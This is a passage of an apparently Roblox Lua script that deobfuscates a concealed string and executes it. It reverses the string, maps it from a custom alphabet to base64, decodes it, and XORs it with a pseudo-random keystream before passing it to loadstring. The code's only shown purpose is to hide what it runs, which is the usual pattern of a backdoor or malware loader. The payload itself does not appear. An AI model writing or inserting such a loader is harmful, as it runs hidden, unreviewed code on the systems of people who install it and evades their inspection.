local p = table.concat(pt)

local std="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local rev={}
for i = 1, 64 do
	rev[string.byte(ab, i)] = string.byte(std, i)
end

local function unscramble(str)
	local out = {}
	for i = 1, #str do
		local ch = string.byte(str, i)
		local r = rev[ch]
		out[i] = r and string.char(r) or string.char(ch)
	end
	return table.concat(out)
end

local rp = string.reverse(p)
local std64 = unscramble(rp)
local xored = game:GetService("HttpService"):Base64Decode(std64)

local state = s
local bytes = {}
for i = 1, #xored do
	state = (a * state + c) % m
	local kb = bit32.rshift(state, 16)
	bytes[i] = string.char(bit32.bxor(string.byte(xored, i), kb))
end

local src = table.concat(bytes)
local f = loadstring(src)
if f then
	f()
end
